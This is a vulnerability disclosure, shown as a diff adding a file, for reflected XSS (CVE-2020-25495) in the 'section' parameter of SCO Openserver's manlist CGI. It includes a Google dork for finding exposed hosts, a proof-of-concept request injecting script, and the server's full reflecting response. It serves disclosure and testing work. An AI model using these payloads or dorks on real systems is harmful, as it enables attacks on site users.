@@ -1,0 +1,128 @@
+# Exploit Title: SCO Openserver 5.0.7 - 'section' Reflected XSS
+# Google Dork: inurl:/cgi-bin/manlist?section
+# Discovered Date: 14/06/2020
+# Author: Ramikan
+# Vendor Homepage: https://www.xinuos.com/products
+# Software Link: https://www.sco.com/products/openserver507/-overview
+# Affected Version: Tested on 5.0.7, 6 can be affected on other versions.
+# Tested on: SCO Openserver 5.0.7 & version 6
+# CVE : CVE-2020-25495
+
+*************************************************************************************************************************************
+
+Vulnerability :Refelected XSS & HTML Injection
+
+*************************************************************************************************************************************
+A reflected Cross-site scripting (XSS) vulnerability in Xinuo (formerly SCO) Openserver version 5 and 6 allows remote attackers to inject arbitrary web script or HTML tag via the parameter 'section'.
+
+
+Affected URL:http://host:8457/cgi-bin/manlist?section="><h1>hello</h1><script>alert(123)</script>
+Affected Paramenter: section
+
+*************************************************************************************************************************************
+POC
+
+*************************************************************************************************************************************
+Request:
+*************************************************************************************************************************************
+GET /cgi-bin/manlist?section="><h1>hello</h1><script>alert(123)</script> HTTP/1.1
+Host: 192.168.20.48:8457
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+*************************************************************************************************************************************
+Response: 
+*************************************************************************************************************************************
+HTTP/1.1 200 OK
+Date: Thu, 03 Sep 2020 17:08:51 GMT
+Server: Apache/1.3.36 (Unix) mod_perl/1.29
+Connection: close
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 2680
+
+<!DOCTYPE html
+	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+	 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
+<head>
+<title>Manual section "><h1>hello</h1></P><script>alert(123)</script></title>
+<META HTTP-EQUIV='Content-Type' CONTENT='text/html;charset=ISO-8859-1'>
+<link rel="stylesheet" type="text/css" href="/styles/lin_moz.css" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+</head>
+<body bgcolor="#FFFFFF" topmargin="0" marginheight="0">
+<!-- Begin DocView navigation toolbar -->
+<!--htdig_noindex-->
+<table
+class=dvtb
+width="100%"
+cellpadding=0
+cellspacing=0
+border=0
+style="padding: 0;"
+>
+<tr valign=top class=dvtb>
+<td class=dvdb>
+<table 
+class=dvtb
+cellpadding=3
+cellspacing=1
+border=0
+bgcolor=#FFFFFF
+width=611
+>
+<tr class=dvtb>
+<td class=dvtb align=center  style="background: #2059A6;">
+<a href="/en/index.html" class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;">
+DOC HOME
+</a></td>
+<td class=dvtb align=center  style="background: #2059A6;">
+<a href="/en/Navpages/sitemap.html" class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;">
+SITE MAP
+</a></td>
+<td class=dvtb align=center  style="background: #2059A6;">
+<a href="/cgi-bin/manform?lang=en" class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;">
+MAN PAGES
+</a></td>
+<td class=dvtb align=center  style="background: #2059A6;">
+<a href="/cgi-bin/infocat?lang=en" class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;">
+GNU INFO
+</a></td>
+<td class=dvtb align=center  style="background: #2059A6;">
+<a href="/cgi-bin/search?lang=en" class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;">
+SEARCH
+</a></td>
+</tr>
+</table>
+</td>
+<td class=dvtb align="left" width=100%>
+<table
+class=dvtb
+cellpadding="3"
+cellspacing="1"
+border="0"
+width="100%"
+bgcolor="#FFFFFF"
+>
+<tr class=dvtb valign="top">
+<td class=dvtb  style="background: #2059A6;" align=center width=100%>
+<a name=null class="dvtb" style="font-size: 10pt; font-family: verdana,helvetica,arial; font-weight: bold; color: #FFFFFF; background: #2059A6;" >
+&nbsp;
+</a>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<!--/htdig_noindex-->
+<!-- End DocView navigation toolbar -->
+<h1>Manual section<h1>Manual section "><h1>hello</h1></P><script>alert(123)</script></h1><PRE>
+</PRE>
+</body></html>
